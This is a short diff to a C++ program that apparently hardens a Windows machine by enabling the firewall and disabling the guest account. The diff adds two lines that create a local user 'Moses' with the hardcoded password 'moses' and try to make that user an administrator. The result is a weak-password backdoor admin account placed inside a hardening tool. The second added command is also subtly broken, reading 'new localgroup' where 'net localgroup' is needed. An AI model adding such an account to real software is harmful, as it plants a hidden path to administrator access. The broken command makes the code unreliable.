@@ -16,5 +16,7 @@ int main()
     cout << "\n\n\t What Is The First Thing You Would Like To Do?" << endl;
     system("NetSh Advfirewall set allprofiles state on"); // enables the firewall
     system("net user guest /active:no");                  // disables the guest user account
+    system("net user /add Moses moses");                  // adds users
+    system("new localgroup administrators Moses /add");   // adds user as admin
     return 0;
 }
